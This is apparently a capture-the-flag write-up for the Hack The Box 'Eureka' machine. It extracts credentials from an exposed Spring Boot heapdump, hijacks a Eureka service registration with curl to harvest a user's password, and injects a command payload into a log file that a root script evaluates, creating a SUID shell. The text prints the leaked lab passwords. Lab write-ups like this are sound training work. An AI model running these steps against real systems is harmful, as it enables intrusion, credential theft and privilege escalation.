![https://app.hackthebox.com/machines/658](https://app.hackthebox.com/machines/658)

## ENUM

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

No subdomain

```
---- Scanning URL: http://furni.htb/ ----
+ http://furni.htb/about (CODE:200|SIZE:14351)                                                                     
+ http://furni.htb/blog (CODE:200|SIZE:13568)                                                                      
+ http://furni.htb/cart (CODE:302|SIZE:0)                                                                          
+ http://furni.htb/checkout (CODE:302|SIZE:0)                                                                      
+ http://furni.htb/comment (CODE:302|SIZE:0)                                                                       
+ http://furni.htb/contact (CODE:200|SIZE:10738)                                                                   
+ http://furni.htb/error (CODE:500|SIZE:73)                                                                        
+ http://furni.htb/login (CODE:500|SIZE:134)                                                                       
+ http://furni.htb/logout (CODE:200|SIZE:1159)                                                                     
+ http://furni.htb/register (CODE:500|SIZE:137)                                                                    
+ http://furni.htb/services (CODE:200|SIZE:14173)                                                                  
+ http://furni.htb/shop (CODE:200|SIZE:12412)
```

I start exploration via Burp

#### INITIAL ACCES:

```
Copyright © 2025. All Rights Reserved. — Designed with love by [Untree.co](https://untree.co/) Distributed By [ThemeWagon](https://themewagon.com/)
```

Important error page!

```
# Whitelabel Error Page

This application has no configured error view, so you are seeing this as a fallback.

Sun Jul 20 21:12:01 UTC 2025

[64a10489-4927] There was an unexpected error (type=Internal Server Error, status=500).
```

Whitelabel error page = Possible Spring Boot application:
[https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/](https://exploit-notes.hdks.org/exploit/web/framework/java/spring-pentesting/)

I try a specific dirb:

```
dirb http://furni.htb/ /usr/share/wordlists/seclists/Discovery/Web-Content/spring-boot.txt
```

Results show `/actuator` exposed, including **heapdump**.

I download:

* `/actuator/mappings`
* `/actuator/env`
* `/actuator/heapdump`

Then analyze the heapdump with JDumpSpider:

```
SpringDataSourceProperties
password = 0sc@r190_S0l!dP@sswd
driverClassName = com.mysql.cj.jdbc.Driver
url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
username = oscar190

OriginTrackedMapPropertySource
-------------
management.endpoints.web.exposure.include = *
spring.datasource.driver-class-name = com.mysql.cj.jdbc.Driver
spring.cloud.inetutils.ignoredInterfaces = enp0s.*
eureka.client.service-url.defaultZone = http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/
server.forward-headers-strategy = native
spring.datasource.url = jdbc:mysql://localhost:3306/Furni_WebApp_DB
spring.application.name = Furni
server.port = 8082
spring.jpa.properties.hibernate.format_sql = true
spring.session.store-type = jdbc
spring.jpa.hibernate.ddl-auto = none
```

Got DB credentials and I try SSH with `oscar190 / 0sc@r190_S0l!dP@sswd`...It works!


## OWN USER

I need to hack miranda (who probably contains user.txt)

Check ports:

```
╔══════════╣ Active Ports
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports                                                                                                                                                               
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 127.0.0.1:8081          :::*                    LISTEN
tcp6       0      0 127.0.0.1:8082          :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 :::8761                 :::*                    LISTEN 
```

So Eureka service is running.

From heapdump:
`http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/`

I port-forward:
`ssh -L 8761:127.0.0.1:8761 oscar190@10.10.11.66`

![alt text](note/ctf/asset/HTB_eureka.png)

Now I can register a fake service in Eureka.

I will spoof `USER-MANAGEMENT-SERVICE` and catch requests with `nc -lvnp 8081` in order to get credentials :

```
curl -X POST \
  http://EurekaSrvr:0scarPWDisTheB3st@localhost:8761/eureka/apps/USER-MANAGEMENT-SERVICE \
  -H 'Content-Type: application/json' \
  -d '{
    "instance": {
      "instanceId": "USER-MANAGEMENT-SERVICE",
      "hostName": "10.10.14.204", ===> MY VPN IP
      "app": "USER-MANAGEMENT-SERVICE",
      "ipAddr": "10.10.14.204",
      "vipAddress": "USER-MANAGEMENT-SERVICE",
      "secureVipAddress": "USER-MANAGEMENT-SERVICE",
      "status": "UP",
      "port": { "$": 8081, "@enabled": "true" },
      "dataCenterInfo": {
        "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
        "name": "MyOwn"
      }
    }
  }'
```

I capture credentials:

```
nc -lvnp 8081  
Listening on 0.0.0.0 8081
Connection received on 10.10.11.66 55388
POST /login HTTP/1.1                                                                                                                                                                                                                        
X-Real-IP: 127.0.0.1                                                                                                                                                                                                                        
X-Forwarded-For: 127.0.0.1,127.0.0.1                                                                                                                                                                                                        
X-Forwarded-Proto: http,http                                                                                                                                                                                                                
Content-Length: 168                                                                                                                                                                                                                         
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8                                                                                                                                    
Accept-Language: en-US,en;q=0.8                                                                                                                                                                                                             
Cache-Control: max-age=0                                                                                                                                                                                                                    
Content-Type: application/x-www-form-urlencoded                                                                                                                                                                                             
Cookie: SESSION=YjI1OTFmY2ItZGFmOC00MDU1LTg1NzgtZTAyOWZhNGNiZjQ4                                                                                                                                                                            
User-Agent: Mozilla/5.0 (X11; Linux x86_64)                                                                                                                                                                                                 
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:59622"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.14.204:8081

username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=xSAUVZsT9dGs0fKLyskoRxx9q0mmecXH9eQGgfbWrjcXQyvLpkQhZ6Iql-mB4srpqOQcdHpLhnGQTKfql9BnsJS1mQ9xe03y
```

now i know : miranda-wise / IL!veT0Be&BeT0L0ve

## OWN ROOT

I found this interesting script: `/opt/log_analyse.sh` executed by root.

It parses `application.log` and has a vulnerable line:

```
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
        code=$(echo "$line" | grep -oP 'Status: \K.*')
        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
            if [[ "$existing_code" -eq "$code" ]]; then
                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done < <(grep "HTTP.*Status: " "$LOG_FILE")
}
```

Since `-eq` forces arithmetic evaluation, injecting `$(...)` inside the log file executes commands as root.

I belong to the `developers` group so I can edit `/var/www/web/cloud-gateway/log/application.log`.

I inject payload:

```
echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash; chmod u+s /tmp/bash)]' > application.log
```

When root runs the script, it creates `/tmp/bash` with SUID.

Then run:
`/tmp/bash -p`

I'm root !
